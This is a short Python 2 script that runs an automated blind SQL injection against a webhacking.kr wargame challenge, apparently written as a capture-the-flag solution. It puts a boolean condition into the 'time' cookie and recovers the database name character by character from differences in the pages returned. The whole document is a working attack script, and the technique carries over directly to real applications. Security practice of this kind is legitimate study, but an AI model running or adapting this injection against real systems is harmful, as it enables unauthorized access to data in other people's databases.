import re, urllib, urllib2
dbname=""
SESSION = "PHPSESSID"

print "-----------------------------------------------"

for j in range(1,15):
    for i in range(33,126):
        url="http://webhacking.kr/challenge/web/web-02/"
        req=urllib2.Request(url)
        req.add_header('Cookie',"time=1432385562 and ascii(substring(database(),%d,1))=%d; PHPSESSID=%s" %(j,i,SESSION))
        read=urllib2.urlopen(req).read()
        ok = re.findall("<!--2070-01-01 09:00:01--></td>",read)

        if ok:
            dbname=dbname+chr(i)
            print "Now dbname:"+dbname
            break

print "---------------------------------------------"
print "dbname : %s" %(dbname)
print "---------------------------------------------"
